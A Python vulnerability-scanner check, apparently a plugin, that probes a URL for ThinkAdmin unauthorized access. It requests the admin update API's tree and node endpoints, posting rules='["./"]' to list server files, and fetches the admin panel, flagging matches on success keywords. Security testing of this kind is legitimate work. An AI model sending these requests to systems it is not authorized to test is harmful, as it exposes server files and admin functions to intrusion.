# coding=utf-8
import os
import random
import requests
from lib.utils.path_info import get_path_info
from lib.utils.package import make_request_package 

# 推荐自定义headers
headers = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:76.0) Gecko/20100101 Firefox/76.0', # 推荐自定义
    'Accept-Language': '*',
    'Accept-Encoding': '*',
    'Keep-Alive': '300',
    'Cache-Control': 'max-age=0',
    'Connection': 'Keep-Alive'
    }

def check(url):
    results = []
    items = {
        "Url": url, 
        "Script": get_path_info(os.path.dirname(__file__)),
        "Vuln": 'thinkadmin_unauthorized_access', 
        "Type": None, 
        "Request": None
    }
    payload1 = "?s=admin/api.Update/tree"
    payload2 = "?s=admin/api.Update/node"
    payload3 = "?s=admin/"

    try:
        s = requests.session()
        s.keep_alive = False
        r = s.get(url + payload1)
        if "成功" in r.text:
            #print("成功")
            items['Type'] = 'GET'
            items['Request'] = make_request_package(r.request)
            results.append(items.copy()) # 只能append一个浅拷贝, 否则result中的数据将被覆盖

        r = s.post(url + payload2, data="rules=%5b%22%2e%5c%2f%22%5d")
        if "成功" in r.text:
            #print("成功")
            items['Type'] = 'POST'
            items['Request'] = make_request_package(r.request)
            results.append(items.copy())

        r = s.get(url + payload3)
        if ("后台首页" in r.text or "文件管理" in r.text or "系统管理" in r.text or "内容管理" in r.text or "系统设置" in r.text):
            #print("成功")
            items['Type'] = 'GET'
            items['Request'] = make_request_package(r.request)
            results.append(items.copy())

        if len(results) == 0:
            return False
        return results

    except Exception as e:
        print(e)
        return False

